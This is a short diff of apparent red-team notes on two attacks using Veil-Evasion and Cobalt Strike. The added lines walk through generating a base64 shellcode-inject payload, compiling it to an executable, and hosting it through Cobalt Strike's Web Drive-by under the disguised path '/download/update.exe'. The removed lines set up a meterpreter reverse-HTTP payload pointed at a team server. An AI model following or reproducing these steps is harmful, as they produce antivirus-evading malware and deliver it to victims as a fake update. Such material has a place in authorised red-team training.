@@ -72,12 +72,20 @@ Attack 1
     cd /opt/Veil
     ./Veil.py
     use 1 (Evasion)
-    list (list payloads)
-    use 9 (cs/meterpreter/rev_http.py)
-    set LHOST <IP of your team server>
+    clean (remove any old artifacts)
+    list (look for payloads with shellcode_inject)
+    use 12 (cs/shellcode_inject/base64.py)
     generate
-    Give your payload a name
+    4 - File with shellcode (\x41\x42..)
+    /root/payload.txt
 
+    cd /var/lib/veil/output/compiled/payload.exe /tmp
+    Attacks > Web Drive-by > Host File
+    Browse to the file > Open
+    Local URI: /download/update.exe
+    Launch
+    Copy the contents > Ok
+    
 Attack 2
     Attacks > Web Drive-by > Scripted Web Delivery (S)
     URI Path: /a
